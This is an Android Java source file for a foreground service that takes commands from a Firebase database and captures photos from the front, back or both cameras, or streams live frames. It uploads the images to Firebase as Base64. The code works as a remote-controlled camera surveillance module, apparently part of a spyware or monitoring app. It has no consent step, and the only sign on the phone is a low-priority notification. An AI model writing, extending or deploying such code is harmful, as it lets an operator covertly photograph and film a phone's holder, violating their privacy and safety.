package com.vikasyadavnsit.cdc.services;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.graphics.Matrix;
import android.graphics.Rect;
import android.graphics.YuvImage;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.util.Size;

import androidx.annotation.NonNull;
import androidx.camera.core.CameraSelector;
import androidx.camera.core.ImageAnalysis;
import androidx.camera.core.ImageCapture;
import androidx.camera.core.ImageCaptureException;
import androidx.camera.core.ImageProxy;
import androidx.camera.lifecycle.ProcessCameraProvider;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import androidx.lifecycle.LifecycleService;

import com.google.common.util.concurrent.ListenableFuture;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.ValueEventListener;
import com.vikasyadavnsit.cdc.R;
import com.vikasyadavnsit.cdc.data.User;
import com.vikasyadavnsit.cdc.enums.ActionStatus;
import com.vikasyadavnsit.cdc.enums.ClickActions;
import com.vikasyadavnsit.cdc.utils.FirebaseUtils;
import com.vikasyadavnsit.cdc.utils.LoggerUtils;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.Map;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class CDCCameraService extends LifecycleService {

    private static final String TAG = "CDCCameraService";
    private static final String CHANNEL_ID = "camera_service_channel";
    private ExecutorService cameraExecutor;
    private long lastAnalysisTime = 0;
    private volatile boolean isLiveActive = false;
    private int currentLensFacing = -1;
    private volatile long liveInterval = 1000;
    private volatile int liveQuality = 30;
    private int liveDurationSec = 15;
    private volatile Size liveResolution = new Size(480, 640);
    private long lastProcessedCaptureTs = 0;
    private final Handler liveHandler = new Handler(Looper.getMainLooper());
    private final Runnable stopLiveRunnable = this::stopLiveFeed;

    @Override
    public void onCreate() {
        super.onCreate();
        com.vikasyadavnsit.cdc.utils.FirebaseUtils.initialize(this);
        cameraExecutor = Executors.newSingleThreadExecutor();
        createNotificationChannel();
        
        // Initialize timestamp to current time to avoid processing old/stale commands on startup
        lastProcessedCaptureTs = System.currentTimeMillis();
        
        // Start foreground only when we actually have a reason to run (or immediately to satisfy OS)
        // For now, we keep it to satisfy Android's foreground service requirements if started as such.
        startForegroundWithNotification();
        listenToConfig();
    }

    private void listenToConfig() {
        FirebaseUtils.getDbRef(FirebaseUtils.getPath("/appSettings/appTriggerSettingsDataMap/" + ClickActions.REQUEST_CAMERA_PERMISSION.name()))
                .addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot snapshot) {
                if (!snapshot.exists()) return;
                User.AppTriggerSettingsData data = snapshot.getValue(User.AppTriggerSettingsData.class);
                if (data == null) return;

                // Sync live params from extraConfig
                if (data.getExtraConfig() != null) {
                    Map<String, Object> extra = data.getExtraConfig();
                    
                    if (extra.containsKey("quality")) {
                        liveQuality = ((Number) extra.get("quality")).intValue();
                    }
                    if (extra.containsKey("duration")) {
                        liveDurationSec = ((Number) extra.get("duration")).intValue();
                    }
                    if (extra.containsKey("resolution")) {
                        String res = (String) extra.get("resolution");
                        if ("720p".equals(res)) liveResolution = new Size(720, 1280);
                        else if ("1080p".equals(res)) liveResolution = new Size(1080, 1920);
                        else liveResolution = new Size(480, 640);
                    }
                }
                liveInterval = data.getInterval() > 0 ? data.getInterval() : 1000;

                // Check for explicit start command in status
                if (ActionStatus.START.equals(data.getActionStatus())) {
                    long cmdTs = data.getLastCaptureTimestamp();
                    
                    // Only execute if it's a NEW command (timestamp is later than what we last processed)
                    if (cmdTs > lastProcessedCaptureTs) {
                        lastProcessedCaptureTs = cmdTs;
                        
                        String mode = data.getCaptureMode();
                        String facing = data.getExtraConfig() != null ? (String) data.getExtraConfig().get("cameraFacing") : "BACK";
                        
                        LoggerUtils.i(TAG, "Triggering Action from Config (Mode: " + mode + ", Facing: " + facing + ")");

                        if ("MANUAL".equals(mode)) {
                            if ("FRONT".equals(facing)) {
                                pendingCaptures.set(1);
                                bindCamera(CameraSelector.LENS_FACING_FRONT, "front");
                            } else if ("BOTH".equals(facing)) {
                                pendingCaptures.set(2);
                                captureBoth();
                            } else {
                                pendingCaptures.set(1);
                                bindCamera(CameraSelector.LENS_FACING_BACK, "back");
                            }
                        } else {
                            int lens = "FRONT".equals(facing) ? CameraSelector.LENS_FACING_FRONT : CameraSelector.LENS_FACING_BACK;
                            startLiveFeed(lens);
                        }
                    }
                    
                    // Reset status in Firebase to avoid repeated triggers on other field updates
                    snapshot.getRef().child("actionStatus").setValue(ActionStatus.IDLE);
                } else if (ActionStatus.STOP.equals(data.getActionStatus())) {
                    LoggerUtils.i(TAG, "Stop command received via config");
                    stopLiveFeed();
                    snapshot.getRef().child("actionStatus").setValue(ActionStatus.IDLE);
                }
            }
            @Override public void onCancelled(DatabaseError error) {}
        });
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "Camera Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private void startForegroundWithNotification() {
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setContentTitle("Camera Active")
                .setContentText("Hardware is being used for capture")
                .setPriority(NotificationCompat.PRIORITY_LOW);
        
        startForeground(3, builder.build());
    }

    private final java.util.concurrent.atomic.AtomicInteger pendingCaptures = new java.util.concurrent.atomic.AtomicInteger(0);

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        String action = intent != null ? intent.getAction() : null;
        LoggerUtils.d(TAG, "onStartCommand: action=" + action);
        startForegroundWithNotification();

        if ("CAPTURE".equals(action)) {
            String type = intent.getStringExtra("type");
            LoggerUtils.i(TAG, "New Capture request: " + type);
            if ("FRONT".equals(type)) {
                pendingCaptures.set(1);
                bindCamera(CameraSelector.LENS_FACING_FRONT, "front");
            } else if ("BACK".equals(type)) {
                pendingCaptures.set(1);
                bindCamera(CameraSelector.LENS_FACING_BACK, "back");
            } else {
                pendingCaptures.set(2);
                captureBoth();
            }
        } else if ("START_LIVE".equals(action)) {
            pendingCaptures.set(0); // Live feed keeps service alive
            String type = intent.getStringExtra("type");
            LoggerUtils.i(TAG, "Starting Live Feed: " + type);
            int lens = "FRONT".equals(type) ? CameraSelector.LENS_FACING_FRONT : CameraSelector.LENS_FACING_BACK;
            startLiveFeed(lens);
        } else if ("STOP_LIVE".equals(action)) {
            LoggerUtils.i(TAG, "Stopping Live Feed");
            stopLiveFeed();
        }
        return START_STICKY;
    }

    private void captureBoth() {
        LoggerUtils.d(TAG, "Triggering dual camera capture sequence");
        bindCamera(CameraSelector.LENS_FACING_BACK, "back");
        new android.os.Handler().postDelayed(() -> bindCamera(CameraSelector.LENS_FACING_FRONT, "front"), 4000);
    }

    private void bindCamera(int lensFacing, String side) {
        if (!new com.vikasyadavnsit.cdc.permissions.PermissionManager().hasPermission(this, com.vikasyadavnsit.cdc.enums.PermissionType.CAMERA)) {
            LoggerUtils.e(TAG, "Cannot bind camera: Permission missing");
            checkAndStopService();
            return;
        }

        LoggerUtils.d(TAG, "Binding camera for " + side + " facing");
        ListenableFuture<ProcessCameraProvider> cameraProviderFuture = ProcessCameraProvider.getInstance(this);
        cameraProviderFuture.addListener(() -> {
            try {
                ProcessCameraProvider cameraProvider = cameraProviderFuture.get();
                CameraSelector selector = new CameraSelector.Builder().requireLensFacing(lensFacing).build();
                
                ImageCapture imageCapture = new ImageCapture.Builder()
                        .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                        .build();

                cameraProvider.unbindAll();
                cameraProvider.bindToLifecycle(this, selector, imageCapture);

                LoggerUtils.d(TAG, "Camera bound, taking picture for " + side);
                imageCapture.takePicture(cameraExecutor, new ImageCapture.OnImageCapturedCallback() {
                    @Override
                    public void onCaptureSuccess(@NonNull ImageProxy image) {
                        LoggerUtils.i(TAG, "Capture SUCCESS (" + side + ")");
                        Bitmap bitmap = imageProxyToBitmap(image);
                        image.close();
                        if (bitmap != null) {
                            // Apply configured quality for manual capture as well
                            String base64 = bitmapToBase64(bitmap, liveQuality);
                            FirebaseUtils.uploadCameraImage(side, base64);
                        }
                        
                        // Lifecycle operations MUST happen on the main thread
                        ContextCompat.getMainExecutor(CDCCameraService.this).execute(() -> {
                            try {
                                ProcessCameraProvider cp = cameraProviderFuture.get();
                                cp.unbindAll();
                                checkAndStopService();
                            } catch (Exception e) {
                                LoggerUtils.e(TAG, "Unbind error: " + e.getMessage());
                            }
                        });
                    }
                  @Override
                    public void onError(@NonNull ImageCaptureException exception) {
                        LoggerUtils.e(TAG, "Capture error (" + side + "): " + exception.getMessage());
                        ContextCompat.getMainExecutor(CDCCameraService.this).execute(() -> {
                            try {
                                ProcessCameraProvider cameraProvider = cameraProviderFuture.get();
                                cameraProvider.unbindAll();
                                checkAndStopService();
                            } catch (Exception e) {
                                LoggerUtils.e(TAG, "Unbind error: " + e.getMessage());
                            }
                        });
                    }
                });

            } catch (ExecutionException | InterruptedException e) {
                e.printStackTrace();
                checkAndStopService();
            }
        }, ContextCompat.getMainExecutor(this));
    }

    private void checkAndStopService() {
        if (isLiveActive) return;
        
        if (pendingCaptures.decrementAndGet() <= 0) {
            stopForeground(true);
            stopSelf();
        }
    }

    private void startLiveFeed(int lensFacing) {
        if (!new com.vikasyadavnsit.cdc.permissions.PermissionManager().hasPermission(this, com.vikasyadavnsit.cdc.enums.PermissionType.CAMERA)) {
            LoggerUtils.e(TAG, "Cannot start live feed: Camera permission missing");
            return;
        }

        // Removed early return to allow re-binding if config changes
        // but we'll check if we really need to unbind/rebind
        
        isLiveActive = true;
        currentLensFacing = lensFacing;
        lastAnalysisTime = 0;
        
        LoggerUtils.i(TAG, "Starting/Refreshing Live Feed: Lens=" + lensFacing + ", Interval=" + liveInterval + "ms, Quality=" + liveQuality + "%, Res=" + liveResolution);

        ListenableFuture<ProcessCameraProvider> cameraProviderFuture = ProcessCameraProvider.getInstance(this);
        cameraProviderFuture.addListener(() -> {
            try {
                ProcessCameraProvider cameraProvider = cameraProviderFuture.get();
                CameraSelector selector = new CameraSelector.Builder().requireLensFacing(lensFacing).build();

                ImageAnalysis.Builder builder = new ImageAnalysis.Builder()
                        .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                        .setOutputImageFormat(ImageAnalysis.OUTPUT_IMAGE_FORMAT_YUV_420_888);

                // Use a standard resolution for live stream stability
                builder.setTargetResolution(new Size(480, 640));

                ImageAnalysis imageAnalysis = builder.build();

                imageAnalysis.setAnalyzer(cameraExecutor, image -> {
                    try {
                        if (!isLiveActive) return;

                        long now = System.currentTimeMillis();
                        if (now - lastAnalysisTime < liveInterval) {
                            return;
                        }
                        lastAnalysisTime = now;

                        byte[] jpegBytes = imageProxyToJpeg(image, liveQuality);
                        if (jpegBytes != null) {
                            String base64 = Base64.encodeToString(jpegBytes, Base64.NO_WRAP);
                            FirebaseUtils.uploadLiveFrame(base64);
                            LoggerUtils.d(TAG, "Live frame uploaded (" + base64.length() + " chars)");
                        } else {
                            LoggerUtils.w(TAG, "Analyzer: imageProxyToJpeg returned null");
                        }
                    } catch (Exception e) {
                        LoggerUtils.e(TAG, "Analyzer Exception: " + e.getMessage());
                    } finally {
                        image.close();
                    }
                });

                cameraProvider.unbindAll();
                cameraProvider.bindToLifecycle(this, selector, imageAnalysis);
                LoggerUtils.d(TAG, "Camera bound to lifecycle for ImageAnalysis");
                
                // Schedule auto-stop
                liveHandler.removeCallbacks(stopLiveRunnable);
                liveHandler.postDelayed(stopLiveRunnable, liveDurationSec * 1000L);

            } catch (Exception e) {
                LoggerUtils.e(TAG, "startLiveFeed Error: " + e.getMessage());
                isLiveActive = false;
            }
        }, ContextCompat.getMainExecutor(this));
    }

    private void stopLiveFeed() {
        isLiveActive = false;
        currentLensFacing = -1;
        liveHandler.removeCallbacks(stopLiveRunnable);
        ListenableFuture<ProcessCameraProvider> cameraProviderFuture = ProcessCameraProvider.getInstance(this);
        cameraProviderFuture.addListener(() -> {
            try {
                cameraProviderFuture.get().unbindAll();
                LoggerUtils.i(TAG, "Stopped Live Feed and Unbound All");
            } catch (Exception ignored) {}
            // Only stop service if no pending manual captures
            if (pendingCaptures.get() <= 0) {
                stopForeground(true);
                stopSelf();
            }
        }, ContextCompat.getMainExecutor(this));
    }

    private byte[] imageProxyToJpeg(ImageProxy image, int quality) {
        if (image.getFormat() == ImageFormat.YUV_420_888) {
            byte[] nv21 = yuv420888ToNv21(image);
            YuvImage yuvImage = new YuvImage(nv21, ImageFormat.NV21, image.getWidth(), image.getHeight(), null);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            // Use quality directly here to avoid double compression
            yuvImage.compressToJpeg(new Rect(0, 0, yuvImage.getWidth(), yuvImage.getHeight()), quality, out);
            byte[] jpegBytes = out.toByteArray();
            
            // If rotation is needed, we still need to decode and rotate
            if (image.getImageInfo().getRotationDegrees() != 0) {
                Bitmap bitmap = BitmapFactory.decodeByteArray(jpegBytes, 0, jpegBytes.length);
                Bitmap rotated = rotateBitmap(bitmap, image.getImageInfo().getRotationDegrees());
                ByteArrayOutputStream rotatedOut = new ByteArrayOutputStream();
                rotated.compress(Bitmap.CompressFormat.JPEG, quality, rotatedOut);
                byte[] rotatedBytes = rotatedOut.toByteArray();
                bitmap.recycle();
                rotated.recycle();
                return rotatedBytes;
            }
            return jpegBytes;
        } else if (image.getFormat() == ImageFormat.JPEG) {
            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
            byte[] bytes = new byte[buffer.remaining()];
            buffer.get(bytes);
            
            if (image.getImageInfo().getRotationDegrees() != 0) {
                Bitmap bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
                Bitmap rotated = rotateBitmap(bitmap, image.getImageInfo().getRotationDegrees());
                ByteArrayOutputStream out = new ByteArrayOutputStream();
                rotated.compress(Bitmap.CompressFormat.JPEG, quality, out);
                byte[] rotatedBytes = out.toByteArray();
                bitmap.recycle();
                rotated.recycle();
                return rotatedBytes;
            }
            return bytes;
        }
        return null;
    }

    private Bitmap imageProxyToBitmap(ImageProxy image) {
        if (image.getFormat() == ImageFormat.JPEG) {
            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
            byte[] bytes = new byte[buffer.remaining()];
            buffer.get(bytes);
            Bitmap bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
            return rotateBitmap(bitmap, image.getImageInfo().getRotationDegrees());
        } else if (image.getFormat() == ImageFormat.YUV_420_888) {
            byte[] nv21 = yuv420888ToNv21(image);
            YuvImage yuvImage = new YuvImage(nv21, ImageFormat.NV21, image.getWidth(), image.getHeight(), null);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            yuvImage.compressToJpeg(new Rect(0, 0, yuvImage.getWidth(), yuvImage.getHeight()), 100, out);
            byte[] imageBytes = out.toByteArray();
            Bitmap bitmap = BitmapFactory.decodeByteArray(imageBytes, 0, imageBytes.length);
            return rotateBitmap(bitmap, image.getImageInfo().getRotationDegrees());
        }
        return null;
    }

    private byte[] yuv420888ToNv21(ImageProxy image) {
        int width = image.getWidth();
        int height = image.getHeight();
        int ySize = width * height;
        int uvSize = width * height / 2;
        byte[] nv21 = new byte[ySize + uvSize];

        ByteBuffer yBuffer = image.getPlanes()[0].getBuffer(); // Y
        ByteBuffer uBuffer = image.getPlanes()[1].getBuffer(); // U
        ByteBuffer vBuffer = image.getPlanes()[2].getBuffer(); // V

        int yRowStride = image.getPlanes()[0].getRowStride();
        int uvRowStride = image.getPlanes()[1].getRowStride();
        int uvPixelStride = image.getPlanes()[1].getPixelStride();

        // Copy Y plane
        int pos = 0;
        if (yRowStride == width) {
            yBuffer.get(nv21, 0, ySize);
            pos = ySize;
        } else {
            for (int row = 0; row < height; row++) {
                yBuffer.position(row * yRowStride);
                yBuffer.get(nv21, pos, width);
                pos += width;
            }
        }

        // Copy UV planes (Interleaved V and U)
        for (int row = 0; row < height / 2; row++) {
            for (int col = 0; col < width / 2; col++) {
                int uvIdx = row * uvRowStride + col * uvPixelStride;
                nv21[pos++] = vBuffer.get(uvIdx);
                nv21[pos++] = uBuffer.get(uvIdx);
            }
        }

        return nv21;
    }

    private Bitmap rotateBitmap(Bitmap bitmap, int degrees) {
        if (degrees == 0 || bitmap == null) return bitmap;
        Matrix matrix = new Matrix();
        matrix.postRotate(degrees);
        return Bitmap.createBitmap(bitmap, 0, 0, bitmap.getWidth(), bitmap.getHeight(), matrix, true);
    }

    private String bitmapToBase64(Bitmap bitmap, int quality) {
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG, quality, outputStream);
        byte[] byteArray = outputStream.toByteArray();
        return Base64.encodeToString(byteArray, Base64.DEFAULT);
    }

    @Override
    public void onDestroy() {
        isLiveActive = false;
        try {
            ProcessCameraProvider cameraProvider = ProcessCameraProvider.getInstance(this).get();
            cameraProvider.unbindAll();
        } catch (Exception ignored) {}

        if (cameraExecutor != null) cameraExecutor.shutdown();
        super.onDestroy();
    }
}
